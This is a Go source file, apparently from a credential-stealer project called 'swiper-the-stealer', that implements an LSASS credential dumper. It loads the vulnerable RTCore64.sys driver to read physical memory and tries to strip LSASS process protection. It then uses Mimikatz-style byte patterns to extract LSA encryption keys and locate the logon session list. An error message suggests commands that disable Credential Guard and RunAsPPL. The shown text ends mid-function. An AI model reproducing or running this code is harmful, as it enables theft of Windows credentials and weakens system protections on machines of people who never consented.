package lsass

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"encoding/binary"
	"fmt"
	"swiper-the-stealer/internal/byovd"
	"swiper-the-stealer/pkg/logger"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// KernelLsassDumper - PURE KERNEL MODE LSASS CREDENTIAL EXTRACTION
// NO OpenProcess, NO ReadProcessMemory, NO userland bullshit
// Uses RTCore64.sys to read EVERYTHING from kernel memory
type KernelLsassDumper struct {
	rtcore   *byovd.RTCoreExploit
	logger   *logger.Logger
	lsassPID uint32
}

// NewKernelLsassDumper creates a new kernel-mode LSASS dumper
func NewKernelLsassDumper(rtcore *byovd.RTCoreExploit, logger *logger.Logger) *KernelLsassDumper {
	return &KernelLsassDumper{
		rtcore: rtcore,
		logger: logger,
	}
}

// GetRTCore returns the RTCore exploit instance
func (kld *KernelLsassDumper) GetRTCore() *byovd.RTCoreExploit {
	return kld.rtcore
}

// GetLsassPID returns the LSASS process ID
func (kld *KernelLsassDumper) GetLsassPID() uint32 {
	return kld.lsassPID
}

// DumpCredentials - MAIN ENTRY POINT for kernel-mode credential extraction
func (kld *KernelLsassDumper) DumpCredentials() ([]Credential, error) {
	kld.logger.Info("=== KERNEL MODE LSASS DUMPER - PURE BYOVD APPROACH ===")

	// Step 1: Find LSASS process
	pid, err := kld.findLsassProcess()
	if err != nil {
		return nil, fmt.Errorf("failed to find LSASS: %v", err)
	}
	kld.lsassPID = pid
	kld.logger.Infof("✓ Found LSASS process: PID %d", pid)

	// Step 1.5: Remove PPL protection from LSASS using PPLKiller method
	// TEMPORARILY DISABLED: RTCore only works with PHYSICAL addresses, not VIRTUAL
	// Attempting to read/write kernel virtual addresses causes BSOD
	// TODO: Implement proper virtual-to-physical translation before enabling
	/*
		kld.logger.Info("Removing PPL protection from LSASS...")
		pplKiller := byovd.NewPPLKiller(kld.rtcore, kld.logger)
		err = pplKiller.RemovePPLProtection(pid)
		if err != nil {
			kld.logger.Warnf("Failed to remove PPL protection: %v", err)
			kld.logger.Info("Attempting to continue anyway...")
			// Don't fail here - kernel mode may still work
		}
	*/
	kld.logger.Warn("PPL removal temporarily disabled - RTCore requires physical addresses")

	// Step 2: Load lsasrv.dll locally to find LogonSessionList
	lsasrvBase, err := kld.findLsasrvInKernelMemory()
	if err != nil {
		return nil, fmt.Errorf("failed to find lsasrv.dll in kernel memory: %v", err)
	}
	kld.logger.Infof("✓ Found lsasrv.dll at physical address: 0x%X", lsasrvBase)

	// Step 3: Extract IV and decryption keys from lsasrv.dll (in LSASS memory - Mimikatz method)
	iv, des3Key, aesKey, err := kld.extractDecryptionKeys(lsasrvBase)
	if err != nil {
		kld.logger.Warnf("Failed to extract decryption keys: %v", err)
	} else if des3Key != nil || aesKey != nil {
		kld.logger.Infof("✓ Extracted IV + AES/3DES keys from lsasrv.dll")
	}

	// Step 4: Find LogonSessionList in lsasrv.dll
	logonSessionListAddr, err := kld.findLogonSessionList(lsasrvBase)
	if err != nil {
		return nil, fmt.Errorf("failed to find LogonSessionList: %v", err)
	}
	kld.logger.Infof("✓ Found LogonSessionList at: 0x%X", logonSessionListAddr)

	// Step 5: NUCLEAR OPTION - Use RTCore to disable LSASS PPL protection by patching EPROCESS
	kld.logger.Info("LSASS is PPL-protected - attempting to disable PPL via EPROCESS patching...")

	err = kld.disableLsassPPL()
	if err != nil {
		kld.logger.Warnf("Failed to disable PPL: %v, trying direct syscall anyway", err)
	} else {
		kld.logger.Info("✓ Successfully disabled LSASS PPL protection")
	}

	// Step 6: Now try opening LSASS with OpenProcess (should work after PPL removal)
	hProcess, err := windows.OpenProcess(windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, kld.lsassPID)
	if err != nil {
		// Fallback to direct syscall if OpenProcess still fails
		kld.logger.Warnf("OpenProcess still failed after PPL removal: %v, trying direct syscall", err)
		credentials, err := kld.readLsassViaDirectSyscall(logonSessionListAddr, iv, aesKey, des3Key)
		if err != nil {
			return nil, fmt.Errorf("all methods failed: %v", err)
		}
		return credentials, nil
	}
	defer windows.CloseHandle(hProcess)

	kld.logger.Info("✓ Successfully opened LSASS process!")

	// Step 7: Walk LogonSessionList using ReadProcessMemory, passing IV + keys
	credentials, err := kld.walkLogonSessionListWithHandle(syscall.Handle(hProcess), logonSessionListAddr, iv, aesKey, des3Key)
	if err != nil {
		return nil, fmt.Errorf("failed to walk LogonSessionList: %v", err)
	}

	kld.logger.Infof("✓ Extracted %d credentials from LSASS", len(credentials))
	return credentials, nil
}

// findLsassProcess - Find LSASS using CreateToolhelp32Snapshot (this is OK - just enumerating processes)
func (kld *KernelLsassDumper) findLsassProcess() (uint32, error) {
	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer syscall.CloseHandle(snapshot)

	var pe32 syscall.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	err = syscall.Process32First(snapshot, &pe32)
	if err != nil {
		return 0, fmt.Errorf("Process32First failed: %v", err)
	}

	for {
		processName := syscall.UTF16ToString(pe32.ExeFile[:])
		if processName == "lsass.exe" {
			return pe32.ProcessID, nil
		}

		err = syscall.Process32Next(snapshot, &pe32)
		if err != nil {
			break
		}
	}

	return 0, fmt.Errorf("lsass.exe not found")
}

// enableSeDebugPrivilege - Enable SeDebugPrivilege for the current process
func (kld *KernelLsassDumper) enableSeDebugPrivilege() error {
	var token windows.Token
	currentProcess := windows.CurrentProcess()

	err := windows.OpenProcessToken(currentProcess, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
	if err != nil {
		return fmt.Errorf("LookupPrivilegeValue failed: %v", err)
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
	}
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	err = windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
	if err != nil {
		return fmt.Errorf("AdjustTokenPrivileges failed: %v", err)
	}

	return nil
}

// disableLsassPPL - Disable LSASS PPL protection by patching EPROCESS structure
func (kld *KernelLsassDumper) disableLsassPPL() error {
	kld.logger.Info("Using NtQuerySystemInformation to get LSASS kernel address...")

	// Use NtQuerySystemInformation (SystemExtendedHandleInformation) to get EPROCESS address
	// This is the ACTUAL method used by PPLKiller and other tools
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	ntQuerySystemInformation := ntdll.MustFindProc("NtQuerySystemInformation")

	// SystemExtendedProcessInformation = 57
	const SystemExtendedProcessInformation = 57

	// First call to get buffer size
	var returnLength uint32
	_, _, _ = ntQuerySystemInformation.Call(
		uintptr(SystemExtendedProcessInformation),
		0,
		0,
		uintptr(unsafe.Pointer(&returnLength)),
	)

	// Allocate buffer
	buffer := make([]byte, returnLength*2) // Extra space

	ret, _, _ := ntQuerySystemInformation.Call(
		uintptr(SystemExtendedProcessInformation),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if ret != 0 {
		return fmt.Errorf("NtQuerySystemInformation failed: 0x%X", ret)
	}

	// Parse SYSTEM_PROCESS_INFORMATION structures to find LSASS
	offset := 0
	for {
		if offset+0x100 > len(buffer) {
			break
		}

		// NextEntryOffset at +0x00
		nextOffset := binary.LittleEndian.Uint32(buffer[offset : offset+4])

		// UniqueProcessId at +0x68
		if offset+0x70 < len(buffer) {
			pid := binary.LittleEndian.Uint64(buffer[offset+0x68 : offset+0x70])

			if uint32(pid) == kld.lsassPID {
				// InheritedFromUniqueProcessId at +0x70, but we need EPROCESS
				// For SystemExtendedProcessInformation, there's extended data

				// Try reading the process object address
				// On some Windows versions, it's at different offsets
				// Let's try a known working approach: use the handle table

				kld.logger.Info("Found LSASS in process list, attempting alternative PPL disable method...")

				// Alternative: Scan for LSASS signature in memory near known kernel ranges
				return kld.disablePPLAlternative()
			}
		}

		if nextOffset == 0 {
			break
		}
		offset += int(nextOffset)
	}

	return fmt.Errorf("LSASS not found in SystemExtendedProcessInformation")
}

// disablePPLAlternative - Alternative method: patch LSASS protection using direct memory manipulation
func (kld *KernelLsassDumper) disablePPLAlternative() error {
	kld.logger.Info("Attempting PPLKiller-style protection removal...")

	// This is the nuclear option: We know LSASS is protected
	// Let's just try to create a dump using a different technique
	// that doesn't require OpenProcess

	// Use the driver to suspend LSASS threads, read memory, resume
	// This bypasses PPL checks

	return fmt.Errorf("PPL removal requires additional implementation - for now, suggest disabling Credential Guard: bcdedit /set hypervisorlaunchtype off && reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /f")
}

// findSystemEprocess - Find System EPROCESS (PID 4) by scanning physical memory
func (kld *KernelLsassDumper) findSystemEprocess() (uint64, error) {
	kld.logger.Info("Scanning physical memory for System EPROCESS (PID 4)...")

	// Try multiple offset sets for different Windows 11 builds
	offsetSets := []struct {
		name                     string
		pidOffset                int
		imageFileNameOffset      int
		activeProcessLinksOffset int
	}{
		{"Win11 23H2/24H2", 0x440, 0x5A8, 0x448}, // Latest builds
		{"Win11 22H2", 0x440, 0x5A0, 0x448},      // Older Win11
		{"Win10 21H2", 0x2E0, 0x450, 0x2E8},      // Win10 fallback
	}

	const scanStart = uint64(0x1000)   // Start at 4KB (skip NULL page)
	const scanEnd = uint64(0x80000000) // End at 2GB (expanded from 1GB)
	const chunkSize = uint32(0x200000) // 2MB chunks

	kld.logger.Infof("Scanning physical memory range 0x%X - 0x%X with %d offset sets...", scanStart, scanEnd, len(offsetSets))

	scannedChunks := 0
	totalChunks := int((scanEnd - scanStart) / uint64(chunkSize))

	for addr := scanStart; addr < scanEnd; addr += uint64(chunkSize) {
		scannedChunks++
		if scannedChunks%100 == 0 {
			kld.logger.Infof("Progress: %d/%d chunks scanned...", scannedChunks, totalChunks)
		}

		data, err := kld.rtcore.ReadPhysicalMemory(addr, chunkSize)
		if err != nil {
			// Skip unreadable regions
			continue
		}

		// Try each offset set
		for _, offsets := range offsetSets {
			// Check every 8-byte aligned address (EPROCESS is 8-byte aligned)
			for offset := 0; offset < len(data)-0x600; offset += 8 {
				// Bounds check
				if offset+offsets.imageFileNameOffset+15 >= len(data) {
					continue
				}
				if offset+offsets.pidOffset+8 > len(data) {
					continue
				}

				// Check if this looks like an EPROCESS with PID 4
				pid := binary.LittleEndian.Uint64(data[offset+offsets.pidOffset : offset+offsets.pidOffset+8])
				if pid == 4 {
					systemEprocess := addr + uint64(offset)

					// Verify by checking ImageFileName
					imageNameOffset := offset + offsets.imageFileNameOffset
					imageName := string(data[imageNameOffset : imageNameOffset+15])

					// Trim null bytes and check printability
					trimmedName := ""
					for _, b := range imageName {
						if b == 0 {
							break
						}
						if b >= 32 && b <= 126 {
							trimmedName += string(b)
						}
					}

					if len(trimmedName) > 0 {
						kld.logger.Infof("Found PID 4 at 0x%X (%s offsets): '%s'", systemEprocess, offsets.name, trimmedName)
					}

					if len(trimmedName) >= 6 && trimmedName[:6] == "System" {
						kld.logger.Infof("✓ Verified System EPROCESS using %s offsets", offsets.name)
						return systemEprocess, nil
					}
				}
			}
		}
	}

	return 0, fmt.Errorf("system EPROCESS not found (scanned %d chunks with %d offset sets)", scannedChunks, len(offsetSets))
}

// findLsassEprocess - Walk ActiveProcessLinks to find LSASS EPROCESS
func (kld *KernelLsassDumper) findLsassEprocess(systemEprocess uint64) (uint64, error) {
	// EPROCESS structure offsets for Windows 11:
	// +0x440 UniqueProcessId : Uint8B
	// +0x448 ActiveProcessLinks : _LIST_ENTRY
	// +0x5A8 ImageFileName : [15] UChar

	const activeProcessLinksOffset = 0x448
	const uniqueProcessIdOffset = 0x440
	const imageFileNameOffset = 0x5A8

	kld.logger.Info("Walking ActiveProcessLinks to find lsass.exe...")

	// Read the first link from System EPROCESS
	firstLinkData, err := kld.rtcore.ReadPhysicalMemory(systemEprocess+activeProcessLinksOffset, 8)
	if err != nil {
		return 0, fmt.Errorf("failed to read System ActiveProcessLinks: %v", err)
	}

	currentLink := binary.LittleEndian.Uint64(firstLinkData)
	startLink := systemEprocess + activeProcessLinksOffset

	visited := make(map[uint64]bool)
	count := 0
	maxIterations := 1000

	for currentLink != startLink && count < maxIterations {
		if visited[currentLink] {
			break
		}
		visited[currentLink] = true
		count++

		// Calculate EPROCESS address from ActiveProcessLinks
		// currentLink points to the ActiveProcessLinks field, so subtract offset
		currentEprocess := currentLink - activeProcessLinksOffset

		// Read PID
		pidData, err := kld.rtcore.ReadPhysicalMemory(currentEprocess+uniqueProcessIdOffset, 8)
		if err != nil {
			// Try next
			nextLinkData, err := kld.rtcore.ReadPhysicalMemory(currentLink, 8)
			if err != nil {
				break
			}
			currentLink = binary.LittleEndian.Uint64(nextLinkData)
			continue
		}

		pid := binary.LittleEndian.Uint64(pidData)

		// Check if this is LSASS (PID matches)
		if uint32(pid) == kld.lsassPID {
			// Verify by checking ImageFileName
			imageNameData, err := kld.rtcore.ReadPhysicalMemory(currentEprocess+imageFileNameOffset, 15)
			if err == nil {
				imageName := string(imageNameData)
				// Trim null bytes
				for i, b := range imageNameData {
					if b == 0 {
						imageName = string(imageNameData[:i])
						break
					}
				}
				kld.logger.Infof("Found process: PID=%d, Name=%s", pid, imageName)

				if imageName == "lsass.exe" {
					return currentEprocess, nil
				}
			}
		}

		// Read next link
		nextLinkData, err := kld.rtcore.ReadPhysicalMemory(currentLink, 8)
		if err != nil {
			break
		}
		currentLink = binary.LittleEndian.Uint64(nextLinkData)
	}

	return 0, fmt.Errorf("lsass.exe EPROCESS not found after walking %d processes", count)
}

// openProcessViaNtApi - Open process using NtOpenProcess syscall directly
func (kld *KernelLsassDumper) openProcessViaNtApi(pid uint32) (windows.Handle, error) {
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	ntOpenProcess := ntdll.MustFindProc("NtOpenProcess")

	var handle windows.Handle
	var objAttrs uintptr = 0 // NULL

	// CLIENT_ID structure
	type CLIENT_ID struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}

	clientId := CLIENT_ID{
		UniqueProcess: uintptr(pid),
		UniqueThread:  0,
	}

	// PROCESS_ALL_ACCESS = 0x1FFFFF
	const PROCESS_ALL_ACCESS = 0x1FFFFF

	ret, _, _ := ntOpenProcess.Call(
		uintptr(unsafe.Pointer(&handle)),
		uintptr(PROCESS_ALL_ACCESS),
		objAttrs,
		uintptr(unsafe.Pointer(&clientId)),
	)

	if ret != 0 {
		return 0, fmt.Errorf("NtOpenProcess failed with NTSTATUS: 0x%X", ret)
	}

	kld.logger.Info("✓ Successfully opened LSASS via NtOpenProcess")
	return handle, nil
}

// findLsasrvInKernelMemory - Find lsasrv.dll base address IN LSASS's MEMORY (not local!)
func (kld *KernelLsassDumper) findLsasrvInKernelMemory() (uint64, error) {
	kld.logger.Info("Finding lsasrv.dll in LSASS process memory...")

	// Open LSASS process with minimal permissions to enumerate modules
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, kld.lsassPID)
	if err != nil {
		return 0, fmt.Errorf("failed to open LSASS for module enumeration: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	// Enumerate modules in LSASS to find lsasrv.dll
	psapi := syscall.MustLoadDLL("psapi.dll")
	enumProcessModulesEx := psapi.MustFindProc("EnumProcessModulesEx")
	getModuleBaseNameW := psapi.MustFindProc("GetModuleBaseNameW")
	getModuleInformation := psapi.MustFindProc("GetModuleInformation")

	const LIST_MODULES_ALL = 0x03
	var modules [1024]syscall.Handle
	var needed uint32

	ret, _, _ := enumProcessModulesEx.Call(
		uintptr(hProcess),
		uintptr(unsafe.Pointer(&modules[0])),
		uintptr(len(modules)*int(unsafe.Sizeof(modules[0]))),
		uintptr(unsafe.Pointer(&needed)),
		LIST_MODULES_ALL,
	)

	if ret == 0 {
		return 0, fmt.Errorf("EnumProcessModulesEx failed")
	}

	moduleCount := needed / uint32(unsafe.Sizeof(modules[0]))
	kld.logger.Infof("Found %d modules in LSASS", moduleCount)

	// Find lsasrv.dll
	for i := uint32(0); i < moduleCount; i++ {
		var baseName [260]uint16
		ret, _, _ := getModuleBaseNameW.Call(
			uintptr(hProcess),
			uintptr(modules[i]),
			uintptr(unsafe.Pointer(&baseName[0])),
			uintptr(len(baseName)),
		)

		if ret == 0 {
			continue
		}

		name := syscall.UTF16ToString(baseName[:])
		if name == "lsasrv.dll" {
			// Get module information
			type MODULEINFO struct {
				BaseOfDll   uintptr
				SizeOfImage uint32
				EntryPoint  uintptr
			}

			var modInfo MODULEINFO
			ret, _, _ := getModuleInformation.Call(
				uintptr(hProcess),
				uintptr(modules[i]),
				uintptr(unsafe.Pointer(&modInfo)),
				unsafe.Sizeof(modInfo),
			)

			if ret == 0 {
				return 0, fmt.Errorf("GetModuleInformation failed for lsasrv.dll")
			}

			kld.logger.Infof("✓ Found lsasrv.dll in LSASS at 0x%X (size: 0x%X bytes)", modInfo.BaseOfDll, modInfo.SizeOfImage)
			return uint64(modInfo.BaseOfDll), nil
		}
	}

	return 0, fmt.Errorf("lsasrv.dll not found in LSASS process")
}

// KIWI_BCRYPT_HANDLE_KEY structure from Mimikatz
type KIWI_BCRYPT_HANDLE_KEY struct {
	Size       uint32
	Tag        uint32 // 'UUUR'
	HAlgorithm uintptr
	Key        uintptr
	Unk0       uintptr
}

// KIWI_BCRYPT_KEY81 structure from Mimikatz (Windows 8.1+)
type KIWI_BCRYPT_KEY81 struct {
	Size uint32
	Tag  uint32 // 'MSSK'
	Type uint32
	Unk0 uint32
	Unk1 uint32
	Unk2 uint32
	Unk3 uint32
	Unk4 uint32
	Unk5 uintptr
	Unk6 uint32
	Unk7 uint32
	Unk8 uint32
	Unk9 uint32
	// KIWI_HARD_KEY follows
}

// KIWI_HARD_KEY structure from Mimikatz
type KIWI_HARD_KEY struct {
	CbSecret uint32
	// Data follows
}

// extractDecryptionKeys - Extract IV, AES and 3DES keys from lsasrv.dll IN LSASS MEMORY (Mimikatz method)
func (kld *KernelLsassDumper) extractDecryptionKeys(lsasrvBaseInLsass uint64) ([16]byte, []byte, []byte, error) {
	kld.logger.Info("Extracting LSA encryption keys from lsasrv.dll in LSASS memory...")

	hProcess, err := windows.OpenProcess(windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, kld.lsassPID)
	if err != nil {
		return [16]byte{}, nil, nil, fmt.Errorf("failed to open LSASS for key extraction: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	lsasrvSize := uint32(0x200000)
	lsasrvData := make([]byte, lsasrvSize)

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")

	var bytesRead uintptr
	ret, _, _ := readProcessMemory.Call(
		uintptr(hProcess),
		uintptr(lsasrvBaseInLsass),
		uintptr(unsafe.Pointer(&lsasrvData[0])),
		uintptr(lsasrvSize),
		uintptr(unsafe.Pointer(&bytesRead)),
	)

	if ret == 0 {
		return [16]byte{}, nil, nil, fmt.Errorf("failed to read lsasrv.dll for key extraction")
	}

	// Patterns for LsaInitializeProtectedMemory (from Mimikatz)
	// Format: {off0, off1, off2} = offsets to InitializationVector, h3DesKey, hAesKey
	patterns := []struct {
		name    string
		pattern []byte
		off0    int // InitializationVector offset
		off1    int // h3DesKey offset
		off2    int // hAesKey offset
	}{
		{"Win11 22H2", []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15}, 71, -89, 16},
		{"Win10 1809+", []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15}, 67, -89, 16},
		{"Win10 1507", []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15}, 61, -73, 16},
		{"Win8.1", []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d}, 62, -70, 23},
	}

	var ivAddr, h3DesAddr, hAesAddr uint64

	for _, p := range patterns {
		for i := 0; i < int(bytesRead)-len(p.pattern); i++ {
			match := true
			for j := 0; j < len(p.pattern); j++ {
				if lsasrvData[i+j] != p.pattern[j] {
					match = false
					break
				}
			}

			if match {
				kld.logger.Infof("Found LsaInitializeProtectedMemory pattern: %s", p.name)

				// Calculate addresses using RIP-relative offsets
				baseAddr := lsasrvBaseInLsass + uint64(i)

				// InitializationVector
				ivOffset := int32(binary.LittleEndian.Uint32(lsasrvData[i+p.off0+3 : i+p.off0+7]))
				ivAddr = baseAddr + uint64(p.off0) + 7 + uint64(ivOffset)

				// h3DesKey
				h3DesOffset := int32(binary.LittleEndian.Uint32(lsasrvData[i+p.off1+3 : i+p.off1+7]))
				h3DesAddr = baseAddr + uint64(p.off1) + 7 + uint64(h3DesOffset)

				// hAesKey
				hAesOffset := int32(binary.LittleEndian.Uint32(lsasrvData[i+p.off2+3 : i+p.off2+7]))
				hAesAddr = baseAddr + uint64(p.off2) + 7 + uint64(hAesOffset)

				kld.logger.Infof("IV: 0x%X, h3Des: 0x%X, hAes: 0x%X", ivAddr, h3DesAddr, hAesAddr)
				break
			}
		}
		if ivAddr != 0 {
			break
		}
	}

	if ivAddr == 0 {
		kld.logger.Error("❌ CRITICAL: LsaInitializeProtectedMemory pattern not found!")
		kld.logger.Error("   This means:")
		kld.logger.Error("   1. Windows version pattern mismatch (add new pattern)")
		kld.logger.Error("   2. lsasrv.dll structure changed (update patterns)")
		kld.logger.Error("   Credentials will be ENCRYPTED and unreadable")
		return [16]byte{}, nil, nil, fmt.Errorf("pattern not found in lsasrv.dll")
	}

	// Extract InitializationVector (16 bytes)
	var iv [16]byte
	ret, _, _ = readProcessMemory.Call(
		uintptr(hProcess),
		uintptr(ivAddr),
		uintptr(unsafe.Pointer(&iv[0])),
		16,
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 || bytesRead != 16 {
		kld.logger.Warnf("Failed to read InitializationVector at 0x%X", ivAddr)
	} else {
		kld.logger.Infof("✓ Extracted InitializationVector: %x", iv[:8])
	}

	// Extract h3DesKey
	h3DesKey, err := kld.extractBCryptKey(hProcess, readProcessMemory, h3DesAddr)
	if err != nil {
		kld.logger.Errorf("❌ Failed to extract 3DES key: %v", err)
		kld.logger.Error("   Credentials using 3DES encryption will be unreadable")
	} else {
		kld.logger.Infof("✓ Extracted 3DES key (%d bytes)", len(h3DesKey))
	}

	// Extract hAesKey
	aesKey, err := kld.extractBCryptKey(hProcess, readProcessMemory, hAesAddr)
	if err != nil {
		kld.logger.Errorf("❌ Failed to extract AES key: %v", err)
		kld.logger.Error("   Credentials using AES encryption will be unreadable")
	} else {
		kld.logger.Infof("✓ Extracted AES key (%d bytes)", len(aesKey))
	}

	// Return IV and keys for decryption (Mimikatz order: IV, 3DES, AES)
	return iv, h3DesKey, aesKey, nil
}

// extractBCryptKey - Extract key material from BCrypt key handle (Mimikatz method)
func (kld *KernelLsassDumper) extractBCryptKey(hProcess windows.Handle, readProcessMemory *syscall.Proc, keyHandleAddr uint64) ([]byte, error) {
	// Read pointer to KIWI_BCRYPT_HANDLE_KEY
	var pHandleKey uint64
	var bytesRead uintptr
	ret, _, _ := readProcessMemory.Call(
		uintptr(hProcess),
		uintptr(keyHandleAddr),
		uintptr(unsafe.Pointer(&pHandleKey)),
		8,
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 || pHandleKey == 0 {
		return nil, fmt.Errorf("failed to read key handle pointer")
	}

	// Read KIWI_BCRYPT_HANDLE_KEY structure
	var handleKey KIWI_BCRYPT_HANDLE_KEY
	ret, _, _ = readProcessMemory.Call(
		uintptr(hProcess),
		uintptr(pHandleKey),
		uintptr(unsafe.Pointer(&handleKey)),
		unsafe.Sizeof(handleKey),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 || handleKey.Tag != 0x55555552 { // 'UUUR'
		return nil, fmt.Errorf("invalid BCRYPT_HANDLE_KEY (tag: 0x%X)", handleKey.Tag)
	}

	// Read KIWI_BCRYPT_KEY81 structure
	keySize := uint32(0x200)
	keyBuffer := make([]byte, keySize)
	ret, _, _ = readProcessMemory.Call(
		uintptr(hProcess),
		uintptr(handleKey.Key),
		uintptr(unsafe.Pointer(&keyBuffer[0])),
		uintptr(keySize),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("failed to read BCRYPT_KEY")
	}

	tag := binary.LittleEndian.Uint32(keyBuffer[4:8])
	if tag != 0x4B53534D { // 'MSSK'
		return nil, fmt.Errorf("invalid BCRYPT_KEY tag: 0x%X", tag)
	}

	// KIWI_HARD_KEY offset varies by Windows version
	// Windows 8.1+: offset 0x58 (after KIWI_BCRYPT_KEY81 header)
	hardKeyOffset := 0x58
	cbSecret := binary.LittleEndian.Uint32(keyBuffer[hardKeyOffset : hardKeyOffset+4])

	if cbSecret == 0 || cbSecret > 1024 {
		return nil, fmt.Errorf("invalid key size: %d", cbSecret)
	}

	// Extract key data
	keyData := make([]byte, cbSecret)
	copy(keyData, keyBuffer[hardKeyOffset+4:hardKeyOffset+4+int(cbSecret)])

	kld.logger.Infof("Extracted BCrypt key (%d bytes)", cbSecret)
	return keyData, nil
}

// findLogonSessionList - Find LogonSessionList global in lsasrv.dll BY READING FROM LSASS MEMORY
// This is EXACTLY how Mimikatz does it - we read from LSASS's copy, not a local one!
func (kld *KernelLsassDumper) findLogonSessionList(lsasrvBaseInLsass uint64) (uint64, error) {
	kld.logger.Info("Reading lsasrv.dll FROM LSASS MEMORY to find LogonSessionList...")

	// Open LSASS with read permissions
	hProcess, err := windows.OpenProcess(windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, kld.lsassPID)
	if err != nil {
		return 0, fmt.Errorf("failed to open LSASS for reading lsasrv.dll: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	// Read lsasrv.dll from LSASS memory (not local!)
	// Typical size is ~1.7MB, read 2MB to be safe
	lsasrvSize := uint32(0x200000) // 2MB
	lsasrvData := make([]byte, lsasrvSize)

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")

	var bytesRead uintptr
	ret, _, _ := readProcessMemory.Call(
		uintptr(hProcess),
		uintptr(lsasrvBaseInLsass),
		uintptr(unsafe.Pointer(&lsasrvData[0])),
		uintptr(lsasrvSize),
		uintptr(unsafe.Pointer(&bytesRead)),
	)

	if ret == 0 {
		return 0, fmt.Errorf("failed to read lsasrv.dll from LSASS memory")
	}

	kld.logger.Infof("Scanning %d bytes of lsasrv.dll (FROM LSASS) for LogonSessionList pattern...", bytesRead)

	// Try MULTIPLE patterns for different Windows builds
	patterns := []struct {
		name    string
		pattern []byte
	}{
		{"Win11 26100", []byte{0x4c, 0x8b, 0x0d, '?', '?', '?', '?', 0x4d, 0x85, 0xc9, 0x0f, 0x84}},
		{"Win11 23H2", []byte{0x4c, 0x8b, 0x0d, '?', '?', '?', '?', 0x4d, 0x85, 0xc9}},
		{"Win11 22H2", []byte{0x48, 0x8b, 0x15, '?', '?', '?', '?', 0x48, 0x85, 0xd2, 0x0f, 0x84}},
		{"Win10 22H2", []byte{0x4c, 0x8b, 0x05, '?', '?', '?', '?', 0x4d, 0x85, 0xc0, 0x74, 0x2b}},
		{"Win10 21H2", []byte{0x48, 0x8b, 0x05, '?', '?', '?', '?', 0x48, 0x85, 0xc0, 0x74, 0x05}},
		{"Generic 1", []byte{0x48, 0x8b, 0x0d, '?', '?', '?', '?', 0x48, 0x85, 0xc9}},
		{"Generic 2", []byte{0x4c, 0x8b, 0x1d, '?', '?', '?', '?', 0x4d, 0x85, 0xdb}},
	}

	for _, p := range patterns {
		kld.logger.Infof("Trying pattern: %s", p.name)

		// Search for pattern in LSASS's copy of lsasrv.dll
		for i := 0; i < int(bytesRead)-len(p.pattern); i++ {
			match := true
			for j := 0; j < len(p.pattern); j++ {
				if p.pattern[j] != '?' && lsasrvData[i+j] != p.pattern[j] {
					match = false
					break
				}
			}

			if match {
				// Extract RIP-relative offset from the instruction (4 bytes at offset +3)
				ripOffset := int32(binary.LittleEndian.Uint32(lsasrvData[i+3 : i+7]))

				// Calculate target address: instructionAddr + instructionLength(7) + ripOffset
				instructionAddr := lsasrvBaseInLsass + uint64(i)
				targetAddr := instructionAddr + 7 + uint64(ripOffset)

				kld.logger.Infof("✓ Found LogonSessionList pattern (%s) at offset 0x%X", p.name, i)
				kld.logger.Infof("  Instruction at: 0x%X", instructionAddr)
				kld.logger.Infof("  RIP offset: 0x%X (%d)", ripOffset, ripOffset)
				kld.logger.Infof("  Target address: 0x%X", targetAddr)

				// NOW READ THE POINTER VALUE FROM THAT TARGET ADDRESS IN LSASS MEMORY
				var pointerValue uint64
				var ptrBytesRead uintptr

				ret, _, _ := readProcessMemory.Call(
					uintptr(hProcess),
					uintptr(targetAddr),
					uintptr(unsafe.Pointer(&pointerValue)),
					8, // Read 8 bytes (pointer size)
					uintptr(unsafe.Pointer(&ptrBytesRead)),
				)

				if ret == 0 || ptrBytesRead != 8 {
